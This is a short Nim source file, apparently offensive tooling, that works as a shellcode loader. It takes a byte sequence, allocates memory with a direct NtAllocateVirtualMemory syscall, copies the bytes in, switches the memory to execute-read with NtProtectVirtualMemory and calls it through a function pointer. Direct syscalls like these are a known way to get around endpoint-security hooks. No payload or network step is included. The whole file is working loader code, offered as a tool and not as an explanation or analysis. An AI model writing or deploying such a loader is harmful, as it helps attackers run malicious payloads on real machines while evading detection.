import nimvoke/syscalls
import winim/lean

# execute takes an byte sequence as input, allocates memory for its size, writes the byte sequence to the allocated memory, and executes it via direct pointer
proc execute(data: seq[byte]) =

    var
        hProcess: HANDLE = 0xFFFFFFFFFFFFFFFF
        shellcodeSize: SIZE_T = cast[SIZE_T](data.len)
        baseAddr: PVOID
        status: NTSTATUS

    status = syscall(NtAllocateVirtualMemory,
            hProcess,
            &baseAddr,
            0,
            &shellcodeSize,
            MEM_RESERVE or MEM_COMMIT,
            PAGE_READWRITE
        )
    
    if status != STATUS_SUCCESS:
        echo toHex(status), "\n"
        raise newException(Exception, "[-] Failed to allocate memory")
    else:
        echo "[+] Allocated memory at: ", repr(baseAddr), "\n"
    
    copyMem(baseAddr, unsafeAddr(data[0]), data.len)
    
    var protectAddress: PVOID = baseAddr
    var oldprotect: ULONG = 0
    status = syscall(NtProtectVirtualMemory,
            hProcess,
            &protectAddress,
            &shellcodeSize,
            PAGE_EXECUTE_READ,
            &oldprotect
        )
    
    if status != STATUS_SUCCESS:
        echo toHex(status), "\n"
        raise newException(Exception, "[-] Failed to protect memory")
    else:
        echo "[+] Memory protection set to RX\n"

    let f = cast[proc(){.nimcall.}](baseAddr)
    f()
